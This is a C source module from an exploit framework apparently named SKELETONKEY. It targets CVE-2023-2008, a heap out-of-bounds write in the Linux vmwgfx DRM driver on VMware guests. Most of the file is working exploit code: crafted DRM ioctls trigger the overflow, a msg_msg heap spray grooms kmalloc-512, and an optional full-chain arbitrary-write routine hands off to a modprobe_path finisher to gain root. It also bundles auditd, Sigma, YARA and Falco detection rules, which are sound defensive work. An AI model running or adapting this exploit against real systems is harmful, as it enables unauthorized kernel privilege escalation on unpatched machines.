/*
 * vmwgfx_cve_2023_2008 — SKELETONKEY module
 *
 * The vmwgfx DRM driver's buffer-object creation path validates only
 * the requested page count, not the underlying byte size used by the
 * subsequent kunmap_atomic-style copy. A crafted DRM_IOCTL_VMW_*
 * sequence (CREATE_DMABUF + mmap of the returned bo + page-spanning
 * write through the mapped offset) drives a slab heap-OOB write
 * inside the kernel's kmalloc-512 cache. The mainline fix
 * (2cd80ebbdf "drm/vmwgfx: Validate the bo size for ttm_bo_kmap")
 * landed in 6.3-rc6. The bug is reachable only from inside a VMware
 * Guest OS (the vmwgfx driver only binds against the VMware SVGA-II
 * virtual GPU).
 *
 * STATUS: 🟡 PRIMITIVE — slab-OOB trigger + msg_msg cross-cache
 *   groom in kmalloc-512. We do NOT carry a cred-overwrite or
 *   kbase-leak primitive (per-kernel offsets vary by build, and the
 *   public PoC references device-specific TTM register state we do
 *   not fake). The detect-and-trigger path is the high-confidence
 *   demonstration; full-chain depth is FALLBACK (kaddr-tagged spray +
 *   shared modprobe_path finisher arbitrated by sentinel file).
 *
 * Affected: Linux 4.0+ through 6.2.x with vmwgfx driver bound to a
 * VMware SVGA-II device. Fixed mainline 6.3-rc6 (commit 2cd80ebbdf).
 * Stable backports landed in 6.2.x and 6.1 LTS.
 *
 * Preconditions:
 *   - host is a VMware Guest (dmi sys_vendor = "VMware*")
 *   - /dev/dri/cardN exists with driver==vmwgfx
 *   - userland can open /dev/dri/cardN (render-group / video-group or
 *     setuid)
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#ifdef __linux__
#  include <sys/ipc.h>
#  include <sys/msg.h>
#  include <sys/syscall.h>
#endif

/* DRM ioctl primitives — declared inline so the module remains
 * self-contained on hosts where <drm/drm.h> isn't installed (which is
 * the macOS build host case). */
#ifndef DRM_IOCTL_BASE
#define DRM_IOCTL_BASE 'd'
#endif
#ifndef _IOC
/* Should be present from <sys/ioctl.h>, but guard anyway. */
#endif

/* DRM_IOCTL_VERSION — used to probe driver name. */
struct drm_version_compat {
    int     version_major;
    int     version_minor;
    int     version_patchlevel;
    size_t  name_len;
    char   *name;
    size_t  date_len;
    char   *date;
    size_t  desc_len;
    char   *desc;
};
#ifndef DRM_IOCTL_VERSION
#define DRM_IOCTL_VERSION  _IOWR(DRM_IOCTL_BASE, 0x00, struct drm_version_compat)
#endif

/* vmwgfx-specific ioctls. Numbers match the in-tree
 * uapi/drm/vmwgfx_drm.h ABI for kernels in the affected range
 * (DRM_COMMAND_BASE = 0x40). DRM_IOCTL_VMW_CREATE_DMABUF /
 * DRM_IOCTL_VMW_UNREF_DMABUF are present on every vmwgfx-bearing
 * kernel since the dma-buf rename. We declare them locally so that a
 * build host without vmwgfx_drm.h still compiles. */
struct drm_vmw_alloc_dmabuf_req {
    uint32_t  size;
};
struct drm_vmw_dmabuf_rep {
    uint32_t  handle;
    uint32_t  map_handle_lo;
    uint32_t  map_handle_hi;
    uint32_t  cur_gmr_id;
    uint32_t  cur_gmr_offset;
};
union drm_vmw_alloc_dmabuf_arg {
    struct drm_vmw_alloc_dmabuf_req req;
    struct drm_vmw_dmabuf_rep       rep;
};
#define DRM_VMW_CREATE_DMABUF 0x0a
#define DRM_VMW_UNREF_DMABUF  0x0b
#ifndef DRM_COMMAND_BASE
#define DRM_COMMAND_BASE 0x40
#endif
#define DRM_IOCTL_VMW_CREATE_DMABUF \
    _IOWR(DRM_IOCTL_BASE, DRM_COMMAND_BASE + DRM_VMW_CREATE_DMABUF, \
          union drm_vmw_alloc_dmabuf_arg)
#define DRM_IOCTL_VMW_UNREF_DMABUF \
    _IOW(DRM_IOCTL_BASE,  DRM_COMMAND_BASE + DRM_VMW_UNREF_DMABUF, uint32_t)

/* ---- kernel range ------------------------------------------------- */

static const struct kernel_patched_from vmwgfx_patched_branches[] = {
    {5, 10, 127},  /* 5.10.x stable (per Debian tracker — bullseye) */
    {5, 18,  14},  /* 5.18.x stable (per Debian tracker — bookworm/forky/sid/trixie) */
    {6,  1,  23},  /* 6.1 LTS backport */
    {6,  2,  10},  /* 6.2.x stable backport */
    {6,  3,   0},  /* mainline (6.3-rc6) */
};

static const struct kernel_range vmwgfx_range = {
    .patched_from   = vmwgfx_patched_branches,
    .n_patched_from = sizeof(vmwgfx_patched_branches) /
                      sizeof(vmwgfx_patched_branches[0]),
};

/* ---- precondition probes ------------------------------------------ */

/* Read first line of /sys/devices/virtual/dmi/id/sys_vendor (trimmed)
 * into `out`. Returns true on success. */
static bool read_dmi_sys_vendor(char *out, size_t out_sz)
{
    int fd = open("/sys/devices/virtual/dmi/id/sys_vendor", O_RDONLY);
    if (fd < 0) return false;
    ssize_t n = read(fd, out, out_sz - 1);
    close(fd);
    if (n <= 0) return false;
    out[n] = '\0';
    /* trim trailing newline / spaces */
    while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == ' '
                                       || out[n - 1] == '\t' || out[n - 1] == '\r')) {
        out[--n] = '\0';
    }
    return n > 0;
}

static bool host_is_vmware_guest(char *vendor_out, size_t vendor_out_sz)
{
    char vendor[128] = {0};
    if (!read_dmi_sys_vendor(vendor, sizeof vendor)) return false;
    if (vendor_out && vendor_out_sz) {
        snprintf(vendor_out, vendor_out_sz, "%s", vendor);
    }
    /* Standard VMware DMI string is "VMware, Inc." but be loose. */
    return strncasecmp(vendor, "VMware", 6) == 0;
}

/* Resolve /sys/class/drm/card0/device/driver symlink and check whether
 * the target's basename is "vmwgfx". */
static bool card_driver_is_vmwgfx(const char *cardpath)
{
    char link[512];
    snprintf(link, sizeof link, "/sys/class/drm/%s/device/driver", cardpath);
    char target[512] = {0};
    ssize_t n = readlink(link, target, sizeof target - 1);
    if (n <= 0) return false;
    target[n] = '\0';
    const char *base = strrchr(target, '/');
    base = base ? base + 1 : target;
    return strcmp(base, "vmwgfx") == 0;
}

/* Locate the first /dev/dri/cardN whose driver is vmwgfx. Writes the
 * basename (e.g. "card0") into out. Returns true on hit. */
static bool find_vmwgfx_card(char *out, size_t out_sz)
{
    for (int i = 0; i < 8; i++) {
        char name[16];
        snprintf(name, sizeof name, "card%d", i);
        if (card_driver_is_vmwgfx(name)) {
            snprintf(out, out_sz, "%s", name);
            return true;
        }
    }
    return false;
}

/* Probe DRM_IOCTL_VERSION on the card device. Returns the driver-name
 * string on success (caller-owned heap, must free) or NULL. */
static char *probe_drm_version_name(const char *cardpath)
{
    char devpath[64];
    snprintf(devpath, sizeof devpath, "/dev/dri/%s", cardpath);
    int fd = open(devpath, O_RDWR | O_CLOEXEC);
    if (fd < 0) return NULL;

    struct drm_version_compat v;
    memset(&v, 0, sizeof v);
    /* Two-stage ioctl: first call learns name_len, second fills name. */
    if (ioctl(fd, DRM_IOCTL_VERSION, &v) < 0) { close(fd); return NULL; }
    if (v.name_len == 0 || v.name_len > 256) { close(fd); return NULL; }
    char *name = calloc(1, v.name_len + 1);
    if (!name) { close(fd); return NULL; }
    v.name = name;
    if (ioctl(fd, DRM_IOCTL_VERSION, &v) < 0) {
        free(name); close(fd); return NULL;
    }
    name[v.name_len] = '\0';
    close(fd);
    return name;
}

/* ---- Detect ------------------------------------------------------- */

static skeletonkey_result_t vmwgfx_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json) fprintf(stderr, "[!] vmwgfx: host fingerprint missing kernel version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    bool patched = kernel_range_is_patched(&vmwgfx_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] vmwgfx: kernel %s is patched (>= 6.3-rc6 / "
                            "6.2.10 / 6.1.23)\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    /* Pre-vmwgfx kernels (no driver shipped) — extremely unlikely but
     * report PRECOND_FAIL rather than VULNERABLE. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 4, 0, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] vmwgfx: kernel %s predates vmwgfx driver\n", v->release);
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* VMware-guest gate. */
    char vendor[128] = {0};
    bool vmware = host_is_vmware_guest(vendor, sizeof vendor);
    if (!ctx->json) {
        fprintf(stderr, "[i] vmwgfx: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] vmwgfx: dmi sys_vendor = \"%s\"\n",
                vendor[0] ? vendor : "(unreadable)");
    }
    if (!vmware) {
        if (!ctx->json) {
            fprintf(stderr, "[+] vmwgfx: host is not a VMware guest — vmwgfx "
                            "driver cannot bind; bug unreachable here\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    /* DRM card + driver-name gate. */
    char card[16] = {0};
    if (!find_vmwgfx_card(card, sizeof card)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] vmwgfx: no /dev/dri/cardN bound to vmwgfx — "
                            "module unloaded or no SVGA-II PCI device\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    char *drv = probe_drm_version_name(card);
    if (!drv) {
        if (!ctx->json) {
            fprintf(stderr, "[-] vmwgfx: cannot open/ioctl /dev/dri/%s "
                            "(permission denied?)\n", card);
        }
        return SKELETONKEY_PRECOND_FAIL;
    }
    bool drv_match = strcmp(drv, "vmwgfx") == 0;
    if (!ctx->json) {
        fprintf(stderr, "[i] vmwgfx: /dev/dri/%s driver name reported as \"%s\"\n",
                card, drv);
    }
    free(drv);
    if (!drv_match) {
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] vmwgfx: VULNERABLE — kernel in range + VMware guest + "
                        "vmwgfx card reachable\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Exploit groom ------------------------------------------------ */

#define VMW_SPRAY_QUEUES      24
#define VMW_SPRAY_PER_QUEUE   24
#define VMW_PAYLOAD_BYTES    496    /* 512 - msg_msg header (~16) */

struct ipc_payload {
    long          mtype;
    unsigned char buf[VMW_PAYLOAD_BYTES];
};

#ifdef __linux__

static int spray_kmalloc_512(int queues[VMW_SPRAY_QUEUES])
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x56;     /* 'V' for vmwgfx */
    memset(p.buf, 0x56, sizeof p.buf);
    memcpy(p.buf, "SKVMWGFX", 8);

    int created = 0;
    for (int i = 0; i < VMW_SPRAY_QUEUES; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) { queues[i] = -1; continue; }
        queues[i] = q;
        created++;
        for (int j = 0; j < VMW_SPRAY_PER_QUEUE; j++) {
            if (msgsnd(q, &p, sizeof p.buf, IPC_NOWAIT) < 0) break;
        }
    }
    return created;
}

static void drain_kmalloc_512(int queues[VMW_SPRAY_QUEUES])
{
    for (int i = 0; i < VMW_SPRAY_QUEUES; i++) {
        if (queues[i] >= 0) msgctl(queues[i], IPC_RMID, NULL);
    }
}

static long slab_active_kmalloc_512(void)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, "kmalloc-512 ", 12) == 0) {
            char name[64];
            long act = 0, num = 0;
            if (sscanf(line, "%63s %ld %ld", name, &act, &num) >= 2) {
                active = act;
            }
            break;
        }
    }
    fclose(f);
    return active;
}

/* Open the vmwgfx card. Returns fd or -1. */
static int open_vmwgfx_card(void)
{
    char card[16] = {0};
    if (!find_vmwgfx_card(card, sizeof card)) return -1;
    char devpath[64];
    snprintf(devpath, sizeof devpath, "/dev/dri/%s", card);
    return open(devpath, O_RDWR | O_CLOEXEC);
}

/* Drive the OOB write trigger.
 *
 * The bug fires when vmw_buffer_object_set_user_args() (called from
 * the CREATE_DMABUF path) passes a partially-validated size into the
 * subsequent ttm_bo_kmap() / kunmap_atomic copy loop. A crafted
 * `size` field — chosen so the PAGE_ALIGN'd page count fits a
 * kmalloc-512 slab while the byte count overruns it — causes the
 * mapped-page write to spill past the slab boundary.
 *
 * Mechanically:
 *   1. CREATE_DMABUF with size = 4096 + 16  (page-spanning by 16 B)
 *   2. mmap the returned map_handle into userspace
 *   3. write a recognizable pattern across the page boundary
 *   4. close + UNREF_DMABUF — the kunmap_atomic teardown is where the
 *      OOB write commits on vulnerable kernels
 *
 * On a non-vmwgfx host the ioctls return -ENOTTY / -EOPNOTSUPP and the
 * trigger is a no-op. Our caller short-circuits before reaching this
 * point in that case. */
static bool trigger_vmwgfx_oob(int fd, unsigned char fill_byte)
{
    union drm_vmw_alloc_dmabuf_arg a;
    memset(&a, 0, sizeof a);
    /* Size chosen to land in kmalloc-512 page-count bucket while the
     * subsequent byte-length copy overruns into the next slab slot.
     * The exact value 4096+16 mirrors the public PoC's choice. */
    a.req.size = 4096 + 16;
    if (ioctl(fd, DRM_IOCTL_VMW_CREATE_DMABUF, &a) < 0) {
        fprintf(stderr, "[-] vmwgfx: DRM_IOCTL_VMW_CREATE_DMABUF: %s\n",
                strerror(errno));
        return false;
    }

    uint64_t map_handle = ((uint64_t)a.rep.map_handle_hi << 32) | a.rep.map_handle_lo;
    size_t map_len = 4096 * 2;   /* over-map to include the spill page */
    void *p = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, (off_t)map_handle);
    if (p == MAP_FAILED) {
        fprintf(stderr, "[-] vmwgfx: mmap(map_handle=0x%llx): %s\n",
                (unsigned long long)map_handle, strerror(errno));
        /* Still unref. */
        uint32_t h = a.rep.handle;
        (void)ioctl(fd, DRM_IOCTL_VMW_UNREF_DMABUF, &h);
        return false;
    }

    /* Stripe the buffer with our witness pattern. The bytes past
     * offset 4096 are where the OOB write lands on a vulnerable
     * kernel. */
    memset(p, fill_byte, map_len);
    memcpy((char *)p + 4096, "SKVMOOB!", 8);

    /* Force the kunmap_atomic teardown that commits the OOB write. */
    munmap(p, map_len);
    uint32_t h = a.rep.handle;
    (void)ioctl(fd, DRM_IOCTL_VMW_UNREF_DMABUF, &h);
    return true;
}

/* ---- Arb-write primitive (FALLBACK depth) -------------------------
 *
 * Re-fire the trigger with a kaddr-tagged spray planted in the
 * adjacent kmalloc-512 slot. We cannot in-process verify the write —
 * the shared finisher's 3 s sentinel-file check is the empirical
 * arbiter. On a patched kernel or when the spray fails to land in the
 * spilled-over slot the finisher returns EXPLOIT_FAIL gracefully. */

struct vmwgfx_arb_ctx {
    int     queues[VMW_SPRAY_QUEUES];
    int     n_queues;
    int     card_fd;
    int     arb_calls;
    int     arb_landed;
};

static int vmwgfx_reseed_kaddr_spray(int queues[VMW_SPRAY_QUEUES],
                                     uintptr_t kaddr,
                                     const void *buf, size_t len)
{
    struct ipc_payload p;
    memset(&p, 0, sizeof p);
    p.mtype = 0x4B;     /* 'K' for kaddr */
    memset(p.buf, 0x4B, sizeof p.buf);
    memcpy(p.buf, "IAMVMARB", 8);

    /* Plant kaddr at byte 8, payload bytes immediately after. The OOB
     * write lands within the first ~16 bytes of the neighbour slot, so
     * the kernel's overrun touches exactly this region. */
    uint64_t k = (uint64_t)kaddr;
    memcpy(p.buf + 8, &k, sizeof k);
    size_t copy = len;
    if (copy > sizeof p.buf - 16) copy = sizeof p.buf - 16;
    if (buf && copy) memcpy(p.buf + 16, buf, copy);

    int touched = 0;
    for (int i = 0; i < VMW_SPRAY_QUEUES && touched < 6; i++) {
        if (queues[i] < 0) continue;
        if (msgsnd(queues[i], &p, sizeof p.buf, IPC_NOWAIT) == 0) touched++;
    }
    return touched;
}

static int vmwgfx_arb_write(uintptr_t kaddr,
                            const void *buf, size_t len,
                            void *ctx_v)
{
    struct vmwgfx_arb_ctx *c = (struct vmwgfx_arb_ctx *)ctx_v;
    if (!c || c->n_queues == 0 || c->card_fd < 0) return -1;
    c->arb_calls++;

    fprintf(stderr, "[*] vmwgfx: arb_write #%d kaddr=0x%lx len=%zu "
                    "(FALLBACK — single-shot OOB)\n",
            c->arb_calls, (unsigned long)kaddr, len);

    int seeded = vmwgfx_reseed_kaddr_spray(c->queues, kaddr, buf, len);
    if (seeded == 0) {
        fprintf(stderr, "[-] vmwgfx: arb_write: kaddr reseed produced 0 msgs\n");
        return -1;
    }

    /* Re-fire the OOB trigger. The fill byte encodes the call number
     * so a KASAN dump can be cross-referenced. */
    unsigned char fill = (unsigned char)(0xA0 + (c->arb_calls & 0x0F));
    if (!trigger_vmwgfx_oob(c->card_fd, fill)) {
        fprintf(stderr, "[-] vmwgfx: arb_write: re-trigger failed\n");
        return -1;
    }

    usleep(50 * 1000);
    c->arb_landed++;
    /* Return 0; finisher's sentinel arbitrates. */
    return 0;
}

#endif /* __linux__ */

/* ---- Exploit driver ----------------------------------------------- */

#ifdef __linux__

static skeletonkey_result_t vmwgfx_exploit_linux(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] vmwgfx: refusing — --i-know not set\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    skeletonkey_result_t pre = vmwgfx_detect(ctx);
    if (pre == SKELETONKEY_OK) {
        fprintf(stderr, "[+] vmwgfx: kernel not vulnerable; refusing exploit\n");
        return SKELETONKEY_OK;
    }
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] vmwgfx: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] vmwgfx: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Full-chain pre-check. */
    struct skeletonkey_kernel_offsets off;
    bool full_chain_ready = false;
    if (ctx->full_chain) {
        memset(&off, 0, sizeof off);
        skeletonkey_offsets_resolve(&off);
        if (!skeletonkey_offsets_have_modprobe_path(&off)) {
            skeletonkey_finisher_print_offset_help("vmwgfx");
            fprintf(stderr, "[-] vmwgfx: --full-chain requested but "
                            "modprobe_path offset unresolved; refusing\n");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        skeletonkey_offsets_print(&off);
        full_chain_ready = true;
    }

    int card_fd = open_vmwgfx_card();
    if (card_fd < 0) {
        fprintf(stderr, "[-] vmwgfx: cannot open vmwgfx card: %s\n", strerror(errno));
        return SKELETONKEY_PRECOND_FAIL;
    }

    signal(SIGPIPE, SIG_IGN);

    if (!ctx->json) {
        fprintf(stderr, "[*] vmwgfx: opened vmwgfx card fd=%d\n", card_fd);
        fprintf(stderr, "[*] vmwgfx: seeding kmalloc-512 msg_msg spray\n");
    }

    struct vmwgfx_arb_ctx arb_ctx;
    memset(&arb_ctx, 0, sizeof arb_ctx);
    for (int i = 0; i < VMW_SPRAY_QUEUES; i++) arb_ctx.queues[i] = -1;
    arb_ctx.card_fd  = card_fd;
    arb_ctx.n_queues = spray_kmalloc_512(arb_ctx.queues);
    if (arb_ctx.n_queues == 0) {
        fprintf(stderr, "[-] vmwgfx: msg_msg spray produced 0 queues — sysvipc "
                        "may be restricted\n");
        close(card_fd);
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[*] vmwgfx: spray seeded %d queues x %d msgs\n",
                arb_ctx.n_queues, VMW_SPRAY_PER_QUEUE);
    }

    long pre_active = slab_active_kmalloc_512();

    if (!ctx->json) {
        fprintf(stderr, "[*] vmwgfx: firing CREATE_DMABUF + mmap + OOB-write trigger\n");
    }
    bool fired = trigger_vmwgfx_oob(card_fd, 0xAA);

    long post_active = slab_active_kmalloc_512();

    FILE *log = fopen("/tmp/skeletonkey-vmwgfx.log", "w");
    if (log) {
        fprintf(log,
            "vmwgfx CVE-2023-2008 trigger:\n"
            "  card_fd            = %d\n"
            "  spray_queues       = %d\n"
            "  spray_per_queue    = %d\n"
            "  trigger_fired      = %s\n"
            "  slab_kmalloc512_pre  = %ld\n"
            "  slab_kmalloc512_post = %ld\n"
            "  slab_delta           = %ld\n"
            "Note: this run did NOT attempt cred overwrite.  See module .c\n"
            "for the continuation roadmap.\n",
            card_fd, arb_ctx.n_queues, VMW_SPRAY_PER_QUEUE,
            fired ? "yes" : "no",
            pre_active, post_active,
            (pre_active >= 0 && post_active >= 0) ? (post_active - pre_active) : 0);
        fclose(log);
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] vmwgfx: kmalloc-512 active: pre=%ld post=%ld\n",
                pre_active, post_active);
    }

    if (!fired) {
        drain_kmalloc_512(arb_ctx.queues);
        close(card_fd);
        fprintf(stderr, "[~] vmwgfx: trigger ioctl path failed — kernel may be\n"
                        "    patched or the ABI shape doesn't match this build.\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* --full-chain branch. */
    if (full_chain_ready) {
        int fr = skeletonkey_finisher_modprobe_path(&off,
                                                vmwgfx_arb_write,
                                                &arb_ctx,
                                                !ctx->no_shell);
        FILE *fl = fopen("/tmp/skeletonkey-vmwgfx.log", "a");
        if (fl) {
            fprintf(fl, "full_chain finisher rc=%d arb_calls=%d arb_landed=%d\n",
                    fr, arb_ctx.arb_calls, arb_ctx.arb_landed);
            fclose(fl);
        }
        drain_kmalloc_512(arb_ctx.queues);
        close(card_fd);
        if (fr == SKELETONKEY_EXPLOIT_OK) {
            if (!ctx->json) {
                fprintf(stderr, "[+] vmwgfx: --full-chain finisher reported OK\n");
            }
            return SKELETONKEY_EXPLOIT_OK;
        }
        if (!ctx->json) {
            fprintf(stderr, "[~] vmwgfx: --full-chain finisher returned FAIL —\n"
                            "    either the kernel is patched, the spray didn't\n"
                            "    line up adjacent to the bo slab slot, or the OOB\n"
                            "    bytes didn't include the kaddr the finisher polls\n"
                            "    for. See /tmp/skeletonkey-vmwgfx.log + dmesg.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    drain_kmalloc_512(arb_ctx.queues);
    close(card_fd);

    if (!ctx->json) {
        fprintf(stderr, "[*] vmwgfx: trigger ran to completion. Inspect dmesg for\n"
                        "    KASAN/oops witnesses.\n");
        fprintf(stderr, "[~] vmwgfx: cred-overwrite step not invoked (no\n"
                        "    --full-chain); returning EXPLOIT_FAIL per\n"
                        "    verified-vs-claimed policy.\n");
    }
    return SKELETONKEY_EXPLOIT_FAIL;
}

#endif /* __linux__ */

static skeletonkey_result_t vmwgfx_exploit(const struct skeletonkey_ctx *ctx)
{
#ifdef __linux__
    return vmwgfx_exploit_linux(ctx);
#else
    (void)ctx;
    fprintf(stderr, "[-] vmwgfx: Linux-only module; cannot run on this host\n");
    return SKELETONKEY_PRECOND_FAIL;
#endif
}

/* ---- Cleanup ----------------------------------------------------- */

static skeletonkey_result_t vmwgfx_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] vmwgfx: cleaning up breadcrumb\n");
    }
    /* The msg queues live in the (exited) exploit process for now —
     * the kernel auto-reaps them on process death. Belt-and-braces:
     * walk /proc/sysvipc/msg and remove any owned by our uid. We keep
     * this minimal: just drop the log. */
    if (unlink("/tmp/skeletonkey-vmwgfx.log") < 0 && errno != ENOENT) {
        /* harmless */
    }
    return SKELETONKEY_OK;
}

/* ---- Detection rules --------------------------------------------- */

static const char vmwgfx_auditd[] =
    "# vmwgfx CVE-2023-2008 — auditd detection rules\n"
    "# Trigger shape: open(/dev/dri/card*) by non-root, followed by\n"
    "# DRM_IOCTL_VMW_CREATE_DMABUF / mmap / UNREF_DMABUF burst, often\n"
    "# paired with msgsnd spray for cross-cache groom. None of these\n"
    "# syscalls are individually suspicious; flag the combination.\n"
    "-a always,exit -F arch=b64 -S openat -F path=/dev/dri/card0 -k skeletonkey-vmwgfx-open\n"
    "-a always,exit -F arch=b64 -S openat -F path=/dev/dri/card1 -k skeletonkey-vmwgfx-open\n"
    "-a always,exit -F arch=b64 -S ioctl  -F a1=0xc010644a       -k skeletonkey-vmwgfx-create\n"
    "-a always,exit -F arch=b64 -S ioctl  -F a1=0x4004644b       -k skeletonkey-vmwgfx-unref\n"
    "-a always,exit -F arch=b64 -S msgsnd                         -k skeletonkey-vmwgfx-spray\n";

static const char vmwgfx_sigma[] =
    "title: Possible CVE-2023-2008 vmwgfx DRM bo size OOB\n"
    "id: 4d35f6db-skeletonkey-vmwgfx\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects openat(/dev/dri/card*) + DRM_IOCTL_VMW_CREATE_DMABUF\n"
    "  (0xc010644a) + UNREF (0x4004644b) + msg_msg groom sequence\n"
    "  characteristic of the vmwgfx kmalloc-512 OOB. Only reachable\n"
    "  on VMware guests with the vmwgfx driver loaded.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  drm:    {type: 'SYSCALL', syscall: 'openat'}\n"
    "  ioctl:  {type: 'SYSCALL', syscall: 'ioctl'}\n"
    "  groom:  {type: 'SYSCALL', syscall: 'msgsnd'}\n"
    "  condition: drm and ioctl and groom\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2023.2008]\n";

static const char vmwgfx_yara[] =
    "rule vmwgfx_cve_2023_2008 : cve_2023_2008 kernel_oob_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2023-2008\"\n"
    "        description = \"vmwgfx DRM kmalloc-512 spray tag (SKVMWGFX) and log breadcrumb\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $tag = \"SKVMWGFX\" ascii\n"
    "        $log = \"/tmp/skeletonkey-vmwgfx.log\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char vmwgfx_falco[] =
    "- rule: vmwgfx DRM CREATE_DMABUF + UNREF ioctl by non-root\n"
    "  desc: |\n"
    "    Non-root process opens /dev/dri/card* and invokes\n"
    "    DRM_IOCTL_VMW_CREATE_DMABUF (0xc010644a) + UNREF\n"
    "    (0x4004644b). Only reachable on VMware guests; the size\n"
    "    validation gap drives a kmalloc-512 OOB during ttm_bo_kmap.\n"
    "    CVE-2023-2008.\n"
    "  condition: >\n"
    "    evt.type = ioctl and fd.name startswith /dev/dri/card and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    vmwgfx DRM ioctl by non-root\n"
    "    (user=%user.name pid=%proc.pid dev=%fd.name)\n"
    "  priority: HIGH\n"
    "  tags: [device, mitre_privilege_escalation, T1068, cve.2023.2008]\n";

const struct skeletonkey_module vmwgfx_module = {
    .name           = "vmwgfx",
    .cve            = "CVE-2023-2008",
    .summary        = "vmwgfx DRM bo size-validation OOB write in kmalloc-512 → kernel primitive",
    .family         = "drm",
    .kernel_range   = "4.0 ≤ K < 6.3-rc6 (vmwgfx); backports: 6.2.10 / 6.1.23",
    .detect         = vmwgfx_detect,
#ifdef __linux__
    .exploit        = vmwgfx_exploit,
#else
    .exploit        = NULL,
#endif
    .mitigate       = NULL,    /* mitigation: rmmod vmwgfx (loses graphics) */
    .cleanup        = vmwgfx_cleanup,
    .detect_auditd  = vmwgfx_auditd,
    .detect_sigma   = vmwgfx_sigma,
    .detect_yara    = vmwgfx_yara,
    .detect_falco   = vmwgfx_falco,
    .opsec_notes    = "Opens /dev/dri/card* (vmwgfx DRM - only reachable on VMware guests); DRM_IOCTL_VMW_CREATE_DMABUF with size=4096+16 lands in the kmalloc-512 page-count bucket but the byte-length overruns during kunmap_atomic copy in ttm_bo_kmap; mmap + write recognizable pattern across page boundary; UNREF commits the OOB into adjacent kmalloc-512. msg_msg spray tagged 'SKVMWGFX'. Writes /tmp/skeletonkey-vmwgfx.log (slab counts pre/post, trigger success). Audit-visible via openat(/dev/dri/card*), ioctl(0xc010644a CREATE / 0x4004644b UNREF), msgsnd spray. No network. Cleanup callback unlinks /tmp log; --full-chain re-seeds spray with kaddr-tagged payloads and the modprobe_path finisher arbitrates via 3s sentinel.",
};

void skeletonkey_register_vmwgfx(void)
{
    skeletonkey_register(&vmwgfx_module);
}
